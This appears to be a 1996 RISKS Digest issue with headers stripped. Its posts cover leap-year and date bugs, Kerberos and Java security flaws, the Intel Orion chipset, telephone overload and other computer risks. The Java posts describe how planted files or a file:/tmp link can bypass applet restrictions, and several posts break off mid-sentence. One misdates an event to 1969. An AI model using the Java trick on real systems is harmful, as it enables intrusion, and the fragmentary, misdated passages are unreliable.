and you get 2/1/1929.  I tried setting the system clock to 1992 and 1988
with the same results.  Excel version 5.0 on the PC does work for 2/29.
<P>
Note that by typing the full date, including year, as 2/29/96, and
then choosing the desired format, you can get what you want.
<P>
The risks?  Relying on automated data formatting.  Not upgrading to the
latest versions of software (upgrading has another set of risks).  And the
risk of not reading comp.risks, otherwise I would not have caught this
error.  The year 2000 should be very interesting...

Researchers at Purdue University have discovered a flaw in the popular
Kerberos computer-security system that affects the way Version 4 of the
software creates the secret keys for encryption.  The problem does not
affect Version 5, unless it is run in a way that emulates Version 4.  The
software is supposed to select its keys randomly from among billions of
numbers, but the problem occurs in the random-number generator, which is
selecting from a much smaller pool of perhaps a million or so, making it
much easier for an intruder to crack the key.  "Basically, we can forge any
key in a matter of seconds," says Purdue professor Eugene Spafford.  The
CERT Coordination Center at Carnegie Mellon University has issued an
advisory on the problem -- CA-96.03 -- and recommends using "patches" to fix
the flaw.  &lt; <A HREF="http://www.sei.cmu.edu/technology/cert.cc.html">http://www.sei.cmu.edu/technology/cert.cc.html</A> &gt; (Chronicle of

After all the difficulties Intel Corp. had in response to the discovery of a
flaw in its Pentium chip [<A HREF="/Risks/16.57.html">RISKS-16.57</A>,58,59,61,62,63,64,66,67,81], the
discovery of a flaw in the new Orion 82450 chipset has caused Intel to
promise being much more open about disclosing this and other flaws.  The
Orion flaw was discussed by Intel on 29 Feb 1969.  This chipset is an
auxiliary for the Pentium pro; the flaw seriously affects I/O bus
throughput: ``as low as five megabytes per second, instead of the regular 25
to 55 megabytes''.  Intel was aware of the fault and told its primary
customers, leaving it to them whether to tell the end users.
<P>
``Intel spokesman Howard High estimated 1 percent to 2 percent of all users
would experience the poor performance though.  High noted there was a big
difference between the Orion fault and the earlier Pentium fault, saying the
former was a performance issue that would not necessarily affect everyone's
performance, while the latter related to data corruption that theoretically
would affect every user.''  [Source: Intel Discloses Flaw in Orion Chipset,

<P>
Well, well.  Here we go again, eh?  The Orion chipset has been widely
touted in the trade press as the logical follow-up to Intel's extremely
popular "Triton" PCI chipset, this time oriented toward the P6 (oops,
"Pentium Pro").  It even included such old-time niceties as support for
parity memory, which was left out of the Triton as an economy measure.
(Hey, people can use the cheaper 8-bit memory!  Who needs the extra bit?)
<P>
Now we find that not only is Orion flawed, but Intel is even trying to
put a new spin on their famous Pentium floating-point bug!  Today's press
releases on Orion seem to indicate that the problem most likely rests with
PCI bus handling, possibly resulting in throughput decreases up to 90%
compared with what might be otherwise expected.  Intel feels this won't
affect most users.  We don't know exactly what that means at this point.
Are they saying that the bug is so subtle that it comes up only rarely?  The
release seems to imply that all of the Orion chipsets shipped to date are
capable of exhibiting the problem.
<P>
Or are they suggesting that only those users whose applications depend on
the full performance of the PCI bus will be affected?  You know the type,
those folks who went out and bought Pentium Pro PCI motherboards for
high-speed graphics, digital audio and video, that sort of thing.  The folks
depending on the bus to work correctly so that their dandy PCI cards will
perform up to spec.  So, maybe Intel is actually saying that so long as your
main applications are spreadsheets and word processing, or similar work that
doesn't depend on PCI bus performance, you won't notice any problem, because
you'll never stress the bus enough anyway.
<P>
In either case, for Intel to know about this from day one, and to keep it
effectively a secret between themselves and the motherboard manufacturers,
is shameful.  What's humorous about all this is the way Intel is now
implying that the Orion bug isn't really a big problem, because they feel
that only a few of the users will notice.  But they then compare this with
the floating-point bug, which they say had a (very small) chance of
affecting anyone with the appropriate steppings of the chip.  Is there some
sort of doublespeak going on here?  Isn't a major reduction in bandwidth,
that can affect any user of the Orion chipset who needs significant
bandwidth, at least as important as the floating-point bug, if not much more
so?  First, Intel comes out with a new processor chip (the P6) that turns
out to execute the software that most people run more slowly than some of
the chips that proceeded it.  Now, the Orion problem.
<P>
Intel's press releases today indicate that they're going to clean up
their act when it comes to early disclosure of hardware problems.  Let's
hope it's true.

There is a serious security bug in the class loading code for the Java
development kit and Netscape (all Java-enabled versions). If an attacker can
arrange for two files (a "Loader" class, and a dynamic library) to be
installed in any readable directory on the client machine, he/she can bypass
all of Java's security restrictions. For example, the applet can read,
write and execute files on the client, with the same permissions as the
user of the browser.
<P>
The only way to avoid this bug at the moment is to disable Java. In Netscape
this can be done by selecting 'Disable Java' in the 'Security preferences...'
section of the 'Options' menu.
<P>
This bug affects all Java implementations based on Sun's source code. It is
not related to JavaScript.

Unfortunately my news server has been off-line for the past few days.
However, I'll try to address some of the questions that were raised on
<A HREF="mailto:strong-java@entmp.org">strong-java@entmp.org</A> and in private mail about the recently-discovered bug
in Java's class loading code. The same questions have probably been asked on
RISKS and/or comp.lang.java as well.
<P>
Apparently I wasn't clear enough in stating that this bug allows classfiles
to be loaded from _any_ directory on the client machine, not simply those on
the CLASSPATH or LD_LIBRARY_PATH. This includes, for example, /tmp,
~ftp/incoming, or an attacker's home directory if he/she has an account on
the same system.
<P>
The attack requires two support files on the client's system: a classfile
and a dynamic library. Both files must be readable by the browser, and the
dynamic library must be executable (this is always true for systems that
have no file permissions). The path to the classfile from the client's root
directory must be known by the attacker in advance.
<P>
Code demonstrating the bug has been written and tested on Linux and Digital
Unix (OSF/1). It should be portable to all POSIX systems, and with a little
work, to any system that supports Java. The demonstration is very easy to
extend - hiding it within any applet would require adding only two extra
lines of code. Changing the C code to execute any command would be a
single-line change. For that reason, the code will not be described in
detail or released publically until patches are available for both Netscape
2.0 and the Java Development Kit.

My laser printer (an Apple Personal LaserWriter) is placed conveniently on
top of a 4 drawer filing cabinet. Recently it ran out of paper, &amp; when I
went to refill it, I pulled the paper cassette out a little too
energetically, losing my grip on it.
<P>
As the paper cassette fell, I made a grab for it, not realising that the
large steel plate in the floor of the cassette (used for lifting paper up
ready for printing) had separated from the plastic tray. The falling steel
plate neatly sliced a small piece of flesh from a point near the knuckle of
the middle finger of my left hand, &amp; several drops of blood fell on the
cassette before I realised what had happened &amp; wrapped a paper tissue round
my finger to stop the flow.
<P>
The steel plate that had popped out so easily was almost impossible to put
back in place, but I eventually managed it by distorting the plastic tray
using the strength still remaining in my unmutilated hand.
<P>
Readers will be pleased to know that though the cassette's function was
unimpaired, the cassette tray suffered rather more than my finger &amp; lost a
sizable piece of plastic from one corner. The steel plate was unscathed.
<P>
This episode highlights a number of computer-related risks :-
<OL>
<LI> Falling computer equipment can be dangerous, both to itself & to people
<P>
<LI> The risks from falling computer equipment usually increase with the height
from which it falls
<P>
<LI> People should not try to catch bits of computer equipment when they fall.
<P>
<LI> If you do try to catch falling computer equipment :-
<UL>
<LI>beware of large bits of steel with sharp edges flying out
<LI>be thankful that the equipment will usually come off worse than you do
</UL>
</OL>
Presumably, moving all computer equipment to floor level would reduce the
risks from falling computer equipment, but increase other types of risk
(e.g. tripping over computers, eye-strain).

In a posting to the Cypherpunks mailing list, Julian Assange
(<A HREF="mailto:proff@suburbia.net">proff@suburbia.net</A>) announced a mailing list to discuss legal
aspects of computer crime. Based on my reading of the announcement,
it appears to have a UK (or at least English Common Law) focus,
though I suspect that it is not limited to UK-specific issues.
The announcement concludes:
<P>
This list has been created in an attempt to mitigate the lack of
tangible resources people involved with computer crime have at their
disposal. It is hoped that by bringing together knowledgeable legal
professionals together with para-legal personnel and informed lay
persons that information and resources relevant to the difficult
task of analyzing, presenting in court, formulating departmental or
company policy or otherwise dealing with computer crime law and
computer crimes may be shared and intelligent discussion and law
reform stimulated.<BR>

I haven't looked further but, judging from the well thought-out
announcement (unfortunately too long for a complete posting to Risks),
it should be of interest to many Risks readers.

<P>
I talked with Alan Pollock at the National Transportation Safety Board in
Washington DC on March 4. The investigation is being conducted by Dominican
Republic with `full participation' of the US NTSB. The Dominican Republic
civil aviation authorities asked the NTSB to make available some information
after a preliminary review of the Cockpit Voice Recorder (CVR) and Flight
Data Recorder (FDR) information.
<P>
[Summary of official information]
<P>
The CVR and FDR were taken to the NTSB on February 28th. A preliminary review
was conducted on February 29th. The quality of the data was good. The crew
discussed airspeed indications early during the takeoff roll and after takeoff.
While climbing through 7300ft, the stick shaker sound was heard, the
aircraft started to descend and the stick shaker sound continued for about
84 seconds until the end of recorded data. Recorded airspeed at stick shaker
activation was 335kts. Ground-based radar and other FDR data indicated a much
lower airspeed. The data are consistent with proper functioning of flight
controls, engines and thrust reversers. There is no evidence of any unusual
weather event or external forces on the aircraft. Investigation is continuing.
<P>
[end of summary]
<P>
The `stick shaker' is a device which `shakes' the control stick when lift
begins to degrade to let the pilots know of an impending aerodynamic stall.
It really gets your attention, quickly, not to speak of raising the
adrenaline level.
<P>
Courtesy of Robert Dorsett, I understand there are three independent airspeed
indication systems in the B757: two electronic and one mechanical backup.
It's unlikely in the extreme that all three were faulty.  Pilots are trained
to deal with faulty information (I've had an airspeed indicator fail, I had
only one system, I'm not a professional pilot). Since controls were
functioning normally and there was no indication of outside disturbance,
I would think it's likely that there was no relevant airfoil contamination or
misfunction. One could further conclude from this that the recorded 335 knots
is likely not the actual airspeed at time of stick shaker activation.
<P>
This raises two issues which will presumably be addressed by further inquiry.
First, why did airspeed drop: is it because the pilots appeared to be
following faulty airspeed information; if so, why were they doing so?
Second, was recovery initiated by the pilots at stick-shaker activation:
if not, why not; if so, was 7300ft altitude sufficient to recover in the
actual situation, or did other factors inhibit recovery? Answers to these
questions will probably lead to other questions.
<P>

<P>
I have made the claim that the nature of Internet opens it to various forms
of deliberate damage and also to inevitable processes of decay and stale
information.  These latter two issues are important because anything that
increases the amount of bad, stale data in the system tends to provide
incentives for more robotic programs and automated mechanisms for use in
screening. These devices have their own problems, in particular their
ability to generate large volumes of traffic which then become loads on the
system and problems for human operators to sort out.  When ill-intentioned
people are added to the mixture, it is possible to have really unpleasant
things happen.  PGN's lead item in <A HREF="/Risks/17.83.html">RISKS-17.83</A> is a case in point.
<P>
The value of access to a data channel is partly a function of the signal to
noise ratio of the data channel.  As the S/N falls there are incentives to
use more sophisticated filters to extract signal from noise.  In analog
systems these noise filters have well defined, if often undesirable,
characteristics.  In the digital realm, the behavior is more difficult to
characterize, especially when the filter design is closely matched to
expected nature of the signal being filtered.
<P>
The growing use of these filters necessarily marks the Internet as a
thermodynamically inefficient process: it is always less efficient to filter
after the fact than it is to clean the signal before.  (The problem, of
course, is that those who bear the cost of filtering at the tail end are not
those who would bear the cost of producing a really clean signal at the
front end!)
<P>
Of course, the net has been successful to date largely because the
information placed there has been of known quality and those involved with
the network have been restrained by storage limits, the originating group's
culture, etc.  In this way there has been a historically high S/N, which
makes searches and conversations relatively low effort and high yield.
<P>
The English economist Gresham's name is attached to a "law" of monetary
systems that says "Bad money pushes good money out of circulation."  Bad
money refers to paper currency, which is easily debased by printing more.
Good money refers to coin minted from precious metals, the value of which
remains relatively constant.  When paper currency is debased, people tend to
hoard their coin and the paper circulates, hence the law.
<P>
I modestly propose Cook's law (named after my Mother) which is "Bad data
drives good data out of circulation."  Here the bad data is the easily
collected, easily stored, largely meaningless collections of characters that
we see in so many areas (e.g. medical records) that are making the value of
effortful contributions (e.g. thoughtful summaries of the relevant details
of a patient's clinical history and current state) hard to find.  I claim
that they are hard to find in part because the other things in the chart
constitute a form of noise that makes extracting the signal hard, and in
part because the value (and incentive) for creating them is largely lost in
the blizzard of other material.  Interestingly, the electronic medical
record has been accompanied, in many places, by an underground paper system
that isolates relevant information from the electronic data in ways that
make it easy to generate and retreive, at least in the context of daily
activity.  We see this especially in the ICU and operating room where
informal records are made on slips of paper, pieces of adhesive tape, etc.
<P>
As the electronic medical record accumulates more data there will be a major
effort to raise the S/N level via information filters not unlike the robotic
devices now being developed to cope with the falling signal and rising noise
levels of the Internet.  Humans will attempt to isolate high signal-low
noise areas by using manual paper methods and hoarding the paper and by
constructing within the electronic environment, vaults with access that is
economically or organizationally restricted to those with incentives to
maintain high S/N.

As a Macintosh user and Netscape user, I've been waiting anxiously for an
implementation of Java for the Mac. Netscape finally released their beta 1
version of their browser with Java implementation about ten days ago, and
like all fans of bleeding-edge technology, I downloaded my copy the moment I
heard about it. There are many problems that can be attributed to such an
early version of the program, I noticed one particularly grievous oversight:
the lack of a provision to turn Java downloading off.
<P>
Volunteer Beta testers have to be willing to deal with many problems, but
being unable to evade such a well-documented and easily avoidable security
risk shouldn't be one of them. I hope this is a problem that Netscape fixes
in their next beta release.

<P>
Netscape and possibly other (future?) Java-enabled browsers do not allow for
system-wide defaults.  They should allow for System Administrators to not
only set defaults for users, but to also override user preferences.  This
would allow the Administrator for a system to disable (for example) Java or
JavaScript system wide.
<P>
The risks in not having such an option?
<P>
Assuming Java is bullet-proof.
<P>
Java is the type of program that has potential security holes in it as
it allows someone to run programs on a machine they do not necessarily
have any real access to.  It is well designed to reduce the risks, but
like any new program, there are bound to be bugs.
<P>
Patches are nice, but there is no way to insure that everyone would be
running the new version.  If the browser allowed preferences based on
version number, one could disable Java for buggy versions, but allow it for
patched versions.

Topic: Java Implementations Can Allow Connections to an Arbitrary Host
<P>
The CERT Coordination Center has received reports of a vulnerability in
implementations of the Java Applet Security Manager. This vulnerability is
present in the Netscape Navigator 2.0 Java implementation and in Release 1.0
of the Java Developer's Kit from Sun Microsystems, Inc. These
implementations do not correctly implement the policy that an applet may
connect only to the host from which the applet was loaded.
<P>
The CERT Coordination Center recommends installing patches from the vendors,
and using the workaround described in Section III until patches can be
installed.
<P>
As we receive additional information relating to this advisory, we
will place it in<BR>

We encourage you to check our README files regularly for updates on

<P>
I.   Description
<P>
There is a serious security problem with the Netscape Navigator 2.0 Java
implementation. The vulnerability is also present in the Java Developer's
Kit 1.0 from Sun Microsystems, Inc. The restriction allowing an applet to
connect only to the host from which it was loaded is not properly
enforced. This vulnerability, combined with the subversion of the DNS
system, allows an applet to open a connection to an arbitrary host on the
Internet.
<P>
In these Java implementations, the Applet Security Manager allows an
applet to connect to any of the IP addresses associated with the name
of the computer from which it came. This is a weaker policy than the
stated policy and leads to the vulnerability described herein.  [...]

Coordination Center or your representative in the Forum of Incident Response

<P>
Following the suicide bombing in Tel-Aviv, Israel yesterday, the local
telephone exchange was reported to have "collapsed" due to overload.  In the
report I heard, "collapse" was not defined.
<P>
To better understand this, it is helpful to know that Israelis are acutely
aware of goings-on.  Israelis are major users of cellular telephones;
terrorist attacks are reported nation-wide literally within minutes.
<P>
I was in Jerusalem last week, very near 2 terrorist attacks.  After the
first, friends and relatives called from out of town, recognizing that I was
nearby, to inquire if all was well.  The following day, I went into town,
boarding the bus exactly when another terrorist attack occured at a nearby
intersection.  As usual, it was reported on the radio within minutes, while
I was still on the bus.  I got off two stops later and used a public pay
phone to call my home-base, to notify them that I was OK.
<P>
I'm not a telephony expert, but with such `social conventions', it is
conceivable that a major telephone exchange can collapse by overloading.

<P>
The program also doesn't appear to handle dates that are not in the 1900's or
2000's, so I couldn't check 2/29/1800 or 2/29/2100 or 2/29/2400.  Of course,<BR>
we'll all be using stardates by the time the year 2400 comes around.

<P>
In each version of Excel that I've examined, the 60th day of the calendar is
29 Feb 1900. Set a cell's format to "date" and type in 60 to see for
yourself.  This means, of course, that computations such as "number of days
between x and y" where one or the other date is in early 1900 will be wrong.
Fixing the bug is also RISKy because that would change the date
interpretation of all ordinal dates greater than 59, in turn making every
existing spreadsheet involving a date compute or display something
unintended. Thought experiment: would YOU fix this bug if Excel were your
product? How?

<P>
A similar situation happened to me.  A heavily time-dependent system I wrote
and maintain utilizes a code-file library to translate between Universal
Time and the user's local time, in this case, Eastern Australia Summer Time.
A problem reported by my customer originated in the code-file library.  The
person who supports the code-file library diagnosed a bug that is triggered
by the switch from Summer (Daylight Savings) time to standard time.
<P>
"But that switch isn't supposed to happen until the end of March!"  True,
but *last* year, it happened at the *beginning* of March, and the code-file
library had not been bounced since the new parameter file, containing this
year's switch date was put into place, so it still thought the switch was on
3rd March.
<P>
I suspect a similar situation is what caused Steve's glitch.  The risk, it
seems to me, is in allowing local governments to futz around with the switch
dates on a whim, rather than setting a firm rule for when to switch.  On the
other hand, the risk may be that users expect computers (or software, or
programmers) to be able to predict with any accuracy, what various governing
bodies' decisions will be, long before those bodies even consider the
question.

<P>
I tried to get some idea of a fix for the faulty data but all I was offered
was "change the clock", "The state government changed the law after the
release" and "were looking into it"!

The risks here are that even the suppliers didn't seem to know there was a

The parameterization data sits in the WIN95 Registry as a hex string, it

this string.

As an Australian living in the US I can relate to Windows 95's woes.  I have
an Australian calendar sent to me each year so I can keep track of local
holidays and events such as these.
<P>
My calendar said that the changeover would be at March 3.  When I last
phoned home, I checked and found that the calendar was wrong.  The calendar
happens to be the Australian printing of the Far Side Desk Calendar.
<P>
This raises one RISK and one amusing possibility:
<P>
Risk: The information used was incorrect in the first place and is relied
upon by numerous sources.  The validation was done and performed correctly
on this wrong information.  (GIGO).
<P>
Amusing Possibility: Microsoft uses a Far Side calendar for their research.
<P>
I also hope that the Australian product support for Microsoft realised what
the problem was early enough to help people.  But from the sounds of it the
detection was not early enough to provide a patch.

<P>
About 25 years ago, I found a remarkable bug in the "midnight routine" of a
program designed to run continuously 24 hours a day, 7 days a week.
<P>
In the New Year's night of any leap year, this routine stored the value 29
for February in the table of month lengths (located in the main memory). The
bug: this variable was calculated two months before it was actually used; if
the program would have to be restarted (for any reason) within January or
February of a leap year, the length of February would have been reset to its
initial value, viz. 28, and the program would have produced garbage, on 29th
February.
<P>
Fortunately, this particular bug did not go into the production version of
the program; otherwise it could have remained undetected for several years.
<P>
The RISKs?
<UL>
<LI>In a program that runs for long periods, the restart behaviour has to be
taken into consideration; you cannot assume that variables will last
forever (i.e., beyond restart), if you don't specifically address this
issue, in your program design.
<P>
<LI>Design, or programming, errors relating to calendrical calculations (or
other issues involving long time spans) may go undetected for long times,
until it may have become rather expensive to correct them. (One example
of this rule are the year-2000 problems, discussed here recently.)

[Omitted discussion duplicating some of <A HREF="/Risks/17.83.html">RISKS-17.83</A>, but based

</I></BLOCKQUOTE>
A 365 day year comes out .2422 days short.  Every four years, this is
4(.2422) = .9688 days short, so an extra day is added.  However, that means<BR>
that every four years is .0312 days too long.  Each 99 year period is
therefore 24(.0312) - 3(.2422) = .0222 days too long.  By omitting the leap
day every 100th year, that period becomes .2422 - .0222 = .22 days too
short.  After 400 years, that adds up to 4(.22) = .88 days too short, so an
extra day is added to make it .12 days too long.  I don't know when or if
another correction occurs.  If so, it is probably after 4,000 years,
bringing the period from 1.2 days long to .2 days short.

&gt;&gt;  [...] the length of the tropical year is 365.24219 days.  ...
<P>
I suggest:
<UL>
<LI>years divisible by   2000 _are_not_ leap years except
<LI>years divisible by   4000 _are_     leap years except
<LI>years divisible by  16000 _are_not_ leap years except
<LI>years divisible by 400000 _are_     leap years.
</UL>
This yields an average length-of-year as given above (365.24219 days, which
has an implied accuracy of ~0.4 seconds). While keeping to multiples of
four, hundred and 400, it would have the undesirable side effect of turning
2000 into a not-leap-year...and by the time the year 400000 comes around,
the length of the day will be longer anyway.

For posterity, here is (correct!) C code to compute whether "y" is a leap
year or not.  As PGN notes, this will have to change sometime probably in
the next 10,000 years to account for the 3 day/10,000 year discrepancy.  I
don't have a reference for this, but I did do copious literature checking a
few years ago when I was frothing at the mouth about this subject.  I
suppose you could count me as an expert because, (a) I'm an astronomer, and
(b) I worked at a Planetarium and this was one of the relatively common
questions asked, that our staff needed to know the correct answer to.
<P>
The more understandable version of the code comes first.  Note that it is
easiest to start with the *longest* periodicity, i.e., the 400 year one, and
then move down to the smaller period cases.  This ensures the longest period
ones don't get lost in the "if it's mod 4" case.
<P><CODE>
typedef unsigned char Boolean;<BR>
enum _boolEnum { false=0, true=1};
<P>
Boolean IsLeapYear(int y)<BR>
{<BR>
if(y % 400 == 0) return true;<BR>
if(y % 100 == 0) return false;<BR>
if(y % 4 == 0) return true;<BR>
return false;<BR>
}
</CODE><P>
The more compact macro version is:
<P><CODE>
#define ISLEAPYEAR(y) ((y) % 400 == 0 || ((y) % 100 != 0 &amp;&amp; (y) % 4 == 0))
</CODE><P>
Finally, note that if you are really lazy and willing to put off your buggy
software for another 100 years, since 2000 is a leap year, then you can use
<P><CODE>
#define CHEAP_LEAP(y) ((y) % 4 == 0)	/* fix before 29 Feb, 2100 */
</CODE><P>
between 1 Jan 1901 and 31 Dec 2099.

You may have heard enough on this topic, but the Explanatory Supplement to
the Astronomical Almanac (ed P. Kenneth Seidelmann, US Naval Observatory,
1992) [...] notes the problem raised by PGN in <A HREF="/Risks/17.83.html">RISKS-17.83</A> -- that
eventually adjustments will be needed -- and states that although various
such adjustments have been proposed, none has been instituted.  It also
raises the interesting point (in section 12.13) that the U.S. legal code
specifies no official national calendar.  Our use of the Gregorian calendar
stems from a 1751 Act of Parliament of the U.K.

Legislation has been introduced in both the House and Senate to permit the
export of data encryption hardware and software if similar technology is
available from foreign suppliers.  The bills affirm the right of U.S.
citizens to use any type of encryption equipment domestically, and prohibit
the mandatory use of special keys that would allow law enforcement officials
access to encrypted messages.  In addition, the legislation would make it a
crime to use encryption technology in the commission of a crime.  (*The New

&gt;<BR>
&gt; Good day.  By way of introduction, I'm the consultant who did the<BR>
&gt; "anti-mailstorm/anti-mailbomb" software that runs on the MX host for<BR>
&gt; WHITEHOUSE.GOV.  Now that the Telecom. Act of 1996 has been signed,<BR>
&gt; the volume of mail through WHITEHOUSE.GOV has gone up significantly.<BR>
&gt; For example, there were about 85,000 lines in the mail log file yesterday.<BR>
&gt;<BR>
&gt; Most of that is just people who want to express their opinion.  However,<BR>
&gt; several misguided individuals have decided that they want to throw a monkey<BR>
&gt; wrench into the works by storming the President's e-mail.<BR>
&gt;<BR>
&gt; I'm writing this to let any system administrators out there know that you<BR>
&gt; may find mail from your site to WHITEHOUSE.GOV is not moving very quickly.<BR>
&gt; This is normal; it's a sign that the automatic protections of that system<BR>
&gt; have kicked in.<BR>
&gt;<BR>
&gt; Without going into details, if too many messages come from a single site,<BR>
&gt; the mail handler will throttle back accepting messages.  Eventually,<BR>
&gt; though, the mail will be accepted for delivery.  If you have legitimate<BR>
&gt; mail, it will eventually get through (many messages from the same<BR>
&gt; correspondent will be flushed without acknowledgement).  However,<BR>
&gt; correspondents who were used to getting a reply within seconds telling them<BR>
&gt; that their message was accepted may see a substantial delay.<BR>
&gt;<BR>
&gt; Finally, if any users on your site have any delusions about the effect of a<BR>
&gt; mail bomb or storm of mail, let me help you dispel them: (1) no one<BR>
&gt; important enough to make a difference will be affected or know or care; (2)<BR>
&gt; if the messages are nasty or threatening enough, someone equally nasty may<BR>
&gt; come and visit; (3) what you'll succeed most in doing is ruining the<BR>

<P>
David Hopwood in RISKS_17.83 mentioned, "If an attacker can arrange for two
files (a "Loader" class, and a dynamic library) to be installed in any
readable directory on the client machine, he/she can bypass all of Java's
security restrictions."
<P>
This does not appear to be a bug (e.g., a slip in the implementation) but
rather a design decision.  It is clearly documented in Java that any applet
downloaded from the local machine is not subjected to the security
restrictions that apply to applets downloaded from elsewhere.  This at first
appears quite reasonable -- otherwise, you cannot do a lot of interesting
things even locally.
<P>
A security problem occurs, however, if the remote web page refers (directly
or indirectly) to code that happens to exist on the client machine.  For
instance, the following line can be found at the bottom of my home page &lt;A
HREF="file:/tmp/play.html"&gt; Fancy page &lt;/A&gt;.  If you click on that, and if
your trojan-co-worker has placed a file called play.html and its associated
class files in /tmp on your machine, those applets will run.
<P>
Alternatively, if someone knows that you have certain code X (applet or not)
in your directory -- suppose you have been developing it as a possible
attack on others -- that person may trick you into invoking X on yourself.
An immediate question is which file should "file:/tmp/play.html" refer to?
The one on the remote machine or the local one?  There are pros and cons
either way.
<P>
The real problem is rooted in the fundamentally flawed philosophy that an
applet you downloaded runs on the local machine as you.  This goes against
years of research in computer security.  Such an applet, unless its
authenticity can be verified to the satisfaction of the downloading client,
should instead run within a confined (protected) sub-domain, and any further
invocations from this code should also run within this sub-domain. (PGN can
tell us all about the required and desirable properties of such a domain.)
<P>
Most machines and OSs obviously do not support such confined domains.  The
point is whether Sun should have done the Java interpreter differently to
make life safer.  For instance, on Unix machines, it is possible to set uid
on downloaded stuff.  This is just one of the many ways to improve security
within the Java execution model.
<P>
Nevertheless, Java security will probably remain a news item until the day
when the fundamentally flawed philosophy is changed.

<P>
Assuming no significant damage to a telephone central office or supporting
infrastructure, the most common cause of "collapse" (defined in this case as
a dramatic form of overloading) is indeed the simple act of too many people
trying to use the phone at the same time.  Telephone switches (and related
trunking) are designed to a designated expected maximum number of
simultaneous calls, which is far less than the total number of
lines/subscribers.  In widespread emergency situations, that threshold can
be easily exceeded.
<P>
In the case of earthquakes here in L.A., the quake itself can cause its own
telephone problem even before people have had a chance to reach for the
handset--the quake can knock so many phones off the hook that (at least
initially--there are timeouts in modern switches) the switch thinks that
everyone and his brother is trying to make calls.  Phones off hook also can
fool some people into thinking that their line is dead, since most modern
switches, after a few minutes of tones and recordings, will only put forth
silence until all phones on a line have been hung up and reset.  If an
extension phone is off-hook under a pile of books, it's easy to miss
(especially in the dark!)
<P>
However, the most common cause of frustration during overload events is that
people are not patient enough.  Modern switches establish a queue for
providing dialtone.  Under normal conditions, you typically get a dialtone
essentially immediately.  But under overload, you might have to wait ten
seconds, thirty seconds, or even for minutes.  It seems like a *long* time.
Most folks don't realize this and keep hanging up and picking up the phone
again, trying to get a dialtone.  Each time they hang up they lose their
place and reset back to the end of the queue.
<P>
So, in emergency situations (assuming you have a serious need that really
requires use of the phone), pick it up and *wait* for dialtone.  To test to
see if you're still connected with the central office, simply blow into the
handset microphone and see if you can hear the blowing lightly in the
earpiece (this is easiest to test by blowing while alternately being hung up
and off-hook).  If you hear a difference, you've still got current on the
line, and your connection to the switch is intact.  If you wait, you'll
probably get dialtone--sooner or later.  (Whether or not there will be
sufficient trunking for your call to get *out* of the office to your
destination is another matter...)

<P>
In <A HREF="/Risks/17.84.html">RISKS-17.84</A>, Jake Livni described an Israeli news report in which it was
stated that the local telephone system "collapsed" shortly after a terrorist
attack. The term "collapse" was not defined in the article.
<P>
Jake also noted that people near to a disaster tend to use a nearby phone to
inform others (family members, etc.) of the event, and that people who know
someone near a reported disaster will attempt to call and verify that
person's well-being.
<P>
While a telephone system can "collapse" in a number of ways, most systems in
use today go to great lengths to avoid a total failure under abnormal
loading (which is caused by the human tendencies noted above). A system's
performance will degrade under such conditions, but not necessarily fail
completely. (This is, of course, neglecting bugs and other unpredictable
situations.) While some systems may indeed fail to the point of requiring
repair service, most will simply slow down until the overload dissipates.
<P>
The Risk in this case is that under disaster conditions, calls to emergency
services may be blocked by bystanders using up the available phone bandwidth
to call Aunt Martha to say, "I'm OK, but you should see the mess!"
Communications into and out of San Francisco area after the World Series
earthquake a few years ago were rendered almost useless by this condition.
<P>
I spoke with the commander of the Central Ohio HAZMAT (Hazardous Material)
Response Team (operated by the local fire departments) two years ago. Part
of his equipment is a cellular telephone, but he admitted that it is rarely
used because by the time his team arrives at a disaster the locals have
swamped the system and he can't get a dial tone. The Team is considering
using volunteer Amateur Radio operators to provide contact with various
telephone information services during a disaster, to bypass the need for
local telephone access at the disaster site.
<P>
Telephone systems are expensive to install and maintain, so operators design
their systems to carry "normal" loads, with some reserve capacity. A system
designed to carry the entire load during a disaster would make the price of
telephone service prohibitively expensive. (Thereby reducing load? Hmmm...)

Last Friday we had a power outage that lasted for about 2 hours.  It was one
of those dirty outages.  The ones where the power goes off and on four or
five time in the span of about two seconds, before it goes out for good.
<P>
We made the decision to move our computer that serves as a file server and
mail server to the other side of the computer room so we could plug it into
the ups system.  This computer carries a lot of baggage with it--a tape
drive, external disk drives, and two printers.
<P>
After we moved this equipment, the security alarm started going off in the
mornings before I was coming in to deactivate it.  One of our observant
employees thought that the printer was the problem.  So we ran some tests,
and sure enough, the security system's motion sensor was detecting the paper
as it came out of the printer and setting off the alarm, which also sounds
an alarm in the campus police dept.
<P>
We have now moved the printer to its original spot, under the motion
sensor, and we are on good terms with the police again.

On March 1st 1989 we received a support call from a user of our equipment
based in the (Persian) Gulf. It wasn't working! The equipment comprises two
boxes, both using the Microware OS/9 operating system (completely blameless
throughout, I hasten to add). Box 'C' was a battery portable computer, with
a real-time clock chip &amp; continuous memory. Box 'D' was a volatile system
where the OS was re-started at each power on. The system was developed in
1987 &amp; first shipped in 1988.
<P>
On 1/3/89, box 'C' attempted to boot box 'D' as usual. As part of this
process, it set the date - to 29/2/89! The OS date validation routine in box
'D' rejected this, quite rightly. Box 'C' *knew* it had the right date - the
RTC chip told it so, and rebooted box 'D' to teach it a lesson. And so the
process continued (all day if necessary).
<P>
It turns out that the RTC chip used - a 58274C - only has a 2 digit year
counter (!). As a result, it needs a separate 2-bit leap year counter, which
has to be correctly initialised. Since the initial boot of the box 'C'
operating system was part of manufacture, initialising the clock chip was
part of the manufacturing test procedure - which was written and tested in
1988!
<P>
We had worked this out quickly enough to call our manufacturing partners in
San Diego CA first thing in their morning &amp; tell them to expect a lot of
support calls that day! The problem was actually in the driver for the RTC
chip, which bypassed the OS date validation code when setting the time &amp;
date.
<P>
This was not the last problem we had with the 58274C clock chip, but that is
another story...xxxxxxxxxx

Another aspect of people's confusion with the rules for dates came to light
the other day when I was tring to match the behaviour of two Julian
functions.
<P>
One, the Oracle numbers is well behaved and successfully handles the leap
from Julian to Gregorian calendars in (a gap of 10 days in 1582). As has no
doubt been discussed before just when the adjustment of calendars were
adjusted was a matter of national preference and several nations did not
make the move until this century.
<P>
Unfortunately the set of public domain clipper routines I
encountered that had been embedded in a new system I was trying
to interface with didn't understand:-
<P>
The Julian Gregorian change.<BR>
No leap years when the year is divisible by 100.<BR>
(I assume the fact that it will get 2000 right is an<BR>
accident).
<P>
The documentation with the routine claimed it was accurate back to
01-Jan-0100; unfortunately it fell over for dates before 01-Jan-1901.
<P>
The risk here is of course embedding 'shrink-wrapped' software in your apps
and trusting it to do the job on the label.  In fact this software didn't
even come with disclaimers I'll post the names of the routines and the
author if people suddenly wonder if their Clipper apps are going to run
alright.
<P>
